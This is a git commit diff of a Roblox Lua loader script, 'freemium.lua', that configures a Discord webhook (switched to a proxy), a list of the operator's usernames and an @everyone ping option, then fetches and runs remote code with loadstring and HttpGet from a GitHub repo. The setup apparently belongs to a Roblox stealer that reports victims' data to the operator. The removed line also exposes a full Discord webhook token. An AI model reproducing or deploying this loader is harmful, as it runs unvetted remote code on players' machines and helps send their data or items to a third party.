8e12e995d2714702934be6b70b9a8cfed1cd4153
ks2006babyy-dev <ks2006babyy@gmail.com>
2026-04-16 15:12:41 +0000

    Update freemium.lua

--- freemium.lua
+++ freemium.lua
@@ -1,9 +1,12 @@
--- Final Loader
-_G.POOR_WEBHOOK = "https://discord.com/api/webhooks/1494345282455077055/1fHPDJmkKw3RMjcdJ9vI2vgK-L50LoDMECcqwHUEVXJkD2wBqG6eFpGLFL2s24FNYiWA"  -- change this to your new one if you want
+-- Final Loader (with working Discord proxy)
 
-_G.MY_USERNAMES = {"daxkidcece", "thisisanalt048", "username"}
+_G.POOR_WEBHOOK = "https://webhook.lewisakura.moe/api/webhooks/PASTE_ONLY_THE_REST_HERE"
+-- Example: https://webhook.lewisakura.moe/api/webhooks/1494345282455077055/1fHPDJmkKw3RMjcdJ9vI2vgK-L50LoDMECcqwHUE
 
-_G.PING_POOR = true
+_G.MY_USERNAMES = {"daxkidcece", "thisisanalto048", "yourusernamehere"}
+-- Add your Roblox usernames here
+
+_G.PING_POOR = true   -- true = loud @everyone ping | false = quiet
 
 task.spawn(function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/ks2006babyy-dev/Baddies/refs/heads/main/freemium.lua", true))()
